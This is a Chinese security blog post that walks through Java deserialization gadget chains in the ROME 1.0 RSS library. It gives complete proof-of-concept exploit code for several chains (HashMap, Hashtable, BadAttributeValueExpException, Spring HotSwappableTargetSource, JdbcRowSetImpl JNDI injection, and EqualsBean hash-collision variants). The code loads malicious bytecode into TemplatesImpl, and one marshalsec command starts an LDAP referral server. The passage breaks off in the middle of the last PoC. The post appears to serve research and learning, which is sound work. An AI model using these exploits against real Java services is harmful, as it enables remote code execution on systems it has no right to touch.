---
title: "ROME链(ToStringBean&EqualsBean)"
onlyTitle: true
date: 2024-9-26 19:04:58
categories:
- java
- 框架漏洞
tags:
- ROME
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8101.jpg
---



ROME 是一个关于 RSS 和 Atom 格式的 java 框架

那什么是 RSS 和 Atom 呢？

RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的**格式**,主要作用用在聚合多个网站的更新内容，并且能够自动通知网站订阅者。同时 RSS 能够以摘要的形式将信息呈现，帮助订阅者快速游览。

Atom 具体的名称是 Atom Syndication Format ，中文译为 Atom 供稿格式。Atom 的诞生是为了解决 RSS 在各个版本遇到的问题，降低 web 内容聚合的难度，特地特出来的一种信息格式。

RSS 的内容需要通过 RSS 阅读器查看，而 ROME 就是其中一个比较老的 RSS 阅读器了。

依赖：

```xml
    <dependency>  
        <groupId>rome</groupId>  
        <artifactId>rome</artifactId>  
        <version>1.0</version>  
    </dependency>
```

影响版本不造，应该是rome<=1.0

## ROME漏洞点

### com.sun.syndication.feed.impl.ToStringBean#toString

位于com.sun.syndication.feed.impl.ToStringBean的toString方法，可以invoke反射执行方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153029644.png)

我们完整的读一下这个toString方法

先调用BeanIntrospector.getPropertyDescriptors，接着调用getPDs

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153400088.png)

getPDs调用getMethods()获取了类的所有方法，再调用另一个双参数的getPDs分别获取getter和setter方法。把一个字段对应的getter和setter合并到一个List。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923153642631.png)

再回到toString，循环getPropertyDescriptors读到的getter,setter组合，用getReadMethod取出getter方法。![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923154059131.png)

如果这个字段的getter满足三个条件：

* 不为空（字段有对应的getter方法）
* 这个getter不是Object.class的方法（getDeclaringClass获取成员所在的类）
* 无参

如果满足，就调用这个getter

#### 回忆在攻击我

我猛地一下想起打shiro CB依赖的过程

PropertyUtils.getProperty触发TemplatesImpl.getOutputProperties

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160255473.png)

进而触发newTransformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923160431753.png)

### com.sun.syndication.feed.impl.EqualsBean#beanEquals

这是ROME依赖第二个漏洞触发点

\_obj和参数obj都不为空，且\_beanClass和obj类型相同时，进入try块

和ToStringBean#toString一样的流程，同时执行了\_obj和obj的getter方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923161620805.png)



OK，直接开始构造链吧，懒得截图分析了

## ROME反序列化链

### ObjectBean链

利用链

```java
HashMap<K,V>.readObject(ObjectInputStream)
HashMap<K,V>.hash(Object)
ObjectBean.hashCode()
EqualsBean.hashCode()                  
EqualsBean.beanHashCode()
ToStringBean.toString()
ToStringBean.toString(String)
TemplatesImpl.getOutputProperties()
```

POC：

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

//HashMap<K,V>.readObject(ObjectInputStream)
//HashMap<K,V>.hash(Object)
//ObjectBean.hashCode()
//EqualsBean.hashCode()
//EqualsBean.beanHashCode()
//ToStringBean.toString()
//ToStringBean.toString(String)
//TemplatesImpl.getOutputProperties()
public class Rome {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);//防止提前触发
//        toStringBean.toString();
//        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("_obj");
        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);
        serialize(hashMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



### HashTable链

适用于HashMap被ban的情况

利用链

```java
HashTable.readObject(ObjectInputStream)
HashTable.reconstitutionPut()              
ObjectBean.hashCode()
EqualsBean.hashCode()                  
EqualsBean.beanHashCode()
ToStringBean.toString()
ToStringBean.toString(String)
TemplatesImpl.getOutputProperties()
```

HashTable.readObject会对每个键值对调用reconstitutionPut

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923194707731.png)

POC：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;

//HashTable.readObject(ObjectInputStream)
//HashTable.reconstitutionPut()
//ObjectBean.hashCode()
//EqualsBean.hashCode()
//EqualsBean.beanHashCode()
//ToStringBean.toString()
//ToStringBean.toString(String)
//TemplatesImpl.getOutputProperties()
public class Rome_HashTable {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);//防止提前触发
//        toStringBean.toString();
//        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        Hashtable hashtable = new Hashtable();
        hashtable.put(objectBean, "godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("_obj");
        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



### BadAttributeValueExpException

CC5入口

利用链

```java
BadAttributeValueExpException.readObject()
Byte.toString()
ToStringBean.toString()
ToStringBean.toString(String)
TemplatesImpl.getOutputProperties()
```

注意构造函数的三元表达式意思为：将输入参数 val 转换为字符串并赋值给 this.val。若 val 为 null，则 this.val 也设为 null。所以这里不能传ToStringBean。传了的话val值为ToStringBean.toString()，然后链式触发到报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923201726557.png)

走到readObject的else if，因为没设置安全管理器触发toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923202421247.png)

POC：

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;
//BadAttributeValueExpException.readObject()
//ToStringBean.toString()
//ToStringBean.toString(String)
//TemplatesImpl.getOutputProperties()
public class Rome_BadAttributeValueExpException {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesClass);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);//防止提前触发
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, toStringBean);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



### HotSwappleTargetSource链

spring的toString链

需要再加个spring依赖：

```xml
	<dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-core</artifactId>
      <version>5.3.28</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.springframework/spring-beans -->
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-beans</artifactId>
      <version>5.3.28</version>
    </dependency>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>5.3.28</version>
    </dependency>
```

HotSwappableTargetSource 位于`org.springframework.aop.target`包下，可以在代理 bean 运行的过程中，动态实时更新 bean 对象，也就是热加载

利用链

```java
HashMap.readObject
HashMap.putVal
HotSwappableTargetSource.equals
XString.equals
ToStringBean.toString
```

其中HostSwappableTargetSource.equals，需要传另一个HotSwappableTargetSource，才能取到Target

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923215255276.png)

触发key.equals并传入我们需要的参数k，在上次分析jdk7u21时讲过了

https://godownio.github.io/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%A7%A6%E5%8F%91equalsImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923220034607.png)

key.equals(k)。先put进参数k，再put进key

这里之所以能直接走进else里，是因为HotSwappableTargetSource.hashCode都是返回同一个值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926132312495.png)

POC：

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

//HashMap.readObject
//HashMap.putVal
//HotSwappableTargetSource.equals
//XString.equals
//ToStringBean.toString
public class rome_HotSwappableTargetSource {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);
        XString xString = new XString(null);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        HashMap hashMap = new HashMap();
        hashMap.put(hotSwappableTargetSource_InputObj,"godown");
        hashMap.put(hotSwappableTargetSource,"godown");
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("_obj");
        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);
        serialize(hashMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

（jdk8 putVal()并没有jdk7u21 put要hash碰撞进入循环才能执行equals

你甚至可以类似7u21在外面套个HashSet或者LinkedHashSet。。好神金哈哈

套LinkedHashSet神金POC：

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.LinkedHashSet;

//HashMap.readObject
//HashMap.putVal
//HotSwappableTargetSource.equals
//XString.equals
//ToStringBean.toString
public class ROME_HotSwappable_LinkedHashSet {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates);
        XString xString = new XString(null);
//        xString.equals(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource_InputObj = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        linkedHashSet.add(hotSwappableTargetSource_InputObj);
        linkedHashSet.add(hotSwappableTargetSource);
        Field toStringBean_objField = ToStringBean.class.getDeclaredField("_obj");
        toStringBean_objField.setAccessible(true);
        toStringBean_objField.set(toStringBean, templatesClass);
        serialize(linkedHashSet);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



### JdbcRowSetImpl链

利用链：

```java
HashMap<K,V>.readObject(ObjectInputStream)
HashMap<K,V>.hash(Object)
ObjectBean.hashCode()
EqualsBean.hashCode()                  
EqualsBean.beanHashCode()
ToStringBean.toString()
ToStringBean.toString(String)
JdbcRowSetImpl.getDatabaseMetaData
BaseRowSet.getDataSourceName
```

适用于过滤了TemplatesImpl的情况

JdbcRowSetImpl.getDatabaseMetaData调用了connect

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154311815.png)

connect里调用了InitialContext.lookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154357757.png)

进一步调用了getURLOrDefaultInitCtx(name).lookup(name)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154707166.png)

直接转JNDI注入了，本地恶意类Path起一个http服务，marshalsec起一个ldap服务：

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#RuntimeEvil 1099
```

POC：

```java
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import java.io.IOException;
import java.util.HashMap;
//HashMap<K,V>.readObject(ObjectInputStream)
//HashMap<K,V>.hash(Object)
//ObjectBean.hashCode()
//EqualsBean.hashCode()
//EqualsBean.beanHashCode()
//ToStringBean.toString()
//ToStringBean.toString(String)
//JdbcRowSetImpl.getDataSourceName
public class Rome_JdbcRowSetImpl {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSetImpl = new JdbcRowSetImpl();
        jdbcRowSetImpl.setDataSourceName("ldap://fake/#JNDI_RuntimeEvil");
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSetImpl);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean,"godown");
        jdbcRowSetImpl.setDataSourceName("ldap://127.0.0.1:1099/#JNDI_RuntimeEvil");
        serialize(hashMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

适用于jdk8<8u191，大于这个版本请转高版本绕过



### EqualsBeans链

触发点在EqualsBeans.beanEquals，适用于ToStringBean被ban的情况，原理见1.2

利用链

```java
HashSet.readObject
HashMap.put
HashMap.putval
HashMap.equals
Abstractmap.equals
EqualsBean.equals
EqualsBean.beanEquals
TemplatesImpl.getOutputProperties()
```

或者

```java
HashTable.readObject(ObjectInputStream)
HashTable.reconstitutionPut()
HashMap.equals
AbstractMap.equals
EqualsBean.equals
EqualsBean.beanEquals
TemplatesImpl.getOutputProperties()
```

同理能用LinkedHashSet封装，也可以beanEquals.equals接前面提到的链套娃

#### HashSet or HashMap链

我们构造到去触发hashMap.equals时，发现走不进那个else

```java
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        EqualsBean equalsBean = new EqualsBean(Templates.class, templatesClass);
//        equalsBean.equals(fakeTemplates);
        HashMap hashMap = new HashMap();
        hashMap.put(fakeTemplates, "godown");
        hashMap.put(equalsBean, "godown");
    }
```

原来是在if停住了，由于我们传入的fakeTemplates和equalsBean不是同一类型，在if中把第二次put的Entry插入了哈希表，而没去else判断二者equals

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926113855845.png)

这里得使`p = tab[i = (n - 1) & hash]`，也就是`(n-1)&hash`有元素，what，不就是前后put的hash(key)相同吗

莫名想起7u21进行hash碰撞，可惜7u80进行了修复，AnnotationInvocationHandler只能代理Annotation类型，适用面很窄

先假设，我们能走到equals方法

hashMap并没有equals方法，调用的是其继承的抽象类，AbstractMap.equals

我们来仔细分析一下这个方法：

判断o是否为Map类型，不是则返回false。确认两者的大小是否相同，不同则返回false。

遍历当前Map的所有键值对：

* 如果当前Map value为null，检查o中的对应键是否存在且其值也为null。
* 如果当前Map value不为null，则调用value.equals(m.get(key))比较两个值是否相等。
  有任何不匹配即返回false。

```java
public boolean equals(Object o) {
    if (o == this)
        return true;

    if (!(o instanceof Map))
        return false;
    Map<?,?> m = (Map<?,?>) o;
    if (m.size() != size())
        return false;

    try {
        Iterator<Entry<K,V>> i = entrySet().iterator();
        while (i.hasNext()) {
            Entry<K,V> e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null && m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}
```

可见这个AbstractMap.equals是用来检查两个map是否相同的

我们构造两个hashMap，使value = equalsBean，m.get(key) = fakeTemplates，就能实现利用链，注意put的先后顺序。先put的作为参数o（m），后put的作为i。且m.get(key)是返回value

```java
HashMap hashMap = new HashMap();
HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();
hashMap1.put(1, fakeTemplates);
hashMap2.put(1, equalsBean);
hashMap.put(hashMap1, "godown");
hashMap.put(hashMap2, "godown");
```

那怎么走进else呢，我们构造两个看上去相同的hashMap，这样可以吗

```java
HashMap hashMap = new HashMap();
HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();
hashMap1.put(1, fakeTemplates);
hashMap1.put(1, equalsBean);
hashMap2.put(1, fakeTemplates);
hashMap2.put(1, equalsBean);
hashMap.put(hashMap1, "godown");
hashMap.put(hashMap2, "godown");
```

答案是不行，因为两次相同的put会刷新值，导致只存在(1, equalsBean)

```javA
hashMap1.put(1, fakeTemplates);
hashMap1.put(1, equalsBean);
```

需要有两个hash值相同的，但是本身不同的作为key，"yy"的hash值等于"zZ"，于是：

```java
HashSet hashSet = new HashSet();
HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();
hashMap1.put("zZ", fakeTemplates);
hashMap1.put("yy", equalsBean);
hashMap2.put("zZ", equalsBean);
hashMap2.put("yy", fakeTemplates);
hashSet.add(hashMap1);
hashSet.add(hashMap2);
```

HashSet POC：（HashSet可改为HashMap）

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.shiro.crypto.hash.Hash;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;


//HashSet.readObject
//HashMap.put
//HashMap.putval
//HashMap.equals
//AbastractMap.equals
//EqualsBean.equals
//EqualsBean.beanEquals
//TemplatesImpl.getOutputProperties()
public class Rome_EqualsBeans {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        HashMap fakehashMap = new HashMap();
        EqualsBean equalsBean = new EqualsBean(HashMap.class, fakehashMap);
//        equalsBean.equals(fakeTemplates);
        HashSet hashSet = new HashSet();
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", fakeTemplates);
        hashMap1.put("yy", equalsBean);
        hashMap2.put("zZ", equalsBean);
        hashMap2.put("yy", fakeTemplates);
        hashSet.add(hashMap1);
        hashSet.add(hashMap2);
        Field _beanClassField = EqualsBean.class.getDeclaredField("_beanClass");
        _beanClassField.setAccessible(true);
        _beanClassField.set(equalsBean, Templates.class);
        Field _objField = EqualsBean.class.getDeclaredField("_obj");
        _objField.setAccessible(true);
        _objField.set(equalsBean, templatesClass);
        serialize(hashSet);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



#### HashTable链

用HashTable.reconstitutionPut触发equals

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926185347607.png)

一样的hash碰撞才能进for循环

HashTable POC：

```java
package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.shiro.crypto.hash.Hash;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;


//HashSet.readObject
//HashMap.put
//HashMap.putval
//HashMap.equals
//AbastractMap.equals
//EqualsBean.equals
//EqualsBean.beanEquals
//TemplatesImpl.getOutputProperties()
//or
//HashTable.readObject(ObjectInputStream)
//HashTable.reconstitutionPut()
//HashMap.equals
//AbstractMap.equals
//EqualsBean.equals
//EqualsBean.beanEquals
//TemplatesImpl.getOutputProperties()
public class Rome_EqualsBeans {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        HashMap fakehashMap = new HashMap();
        EqualsBean equalsBean = new EqualsBean(HashMap.class, fakehashMap);
//        equalsBean.equals(fakeTemplates);
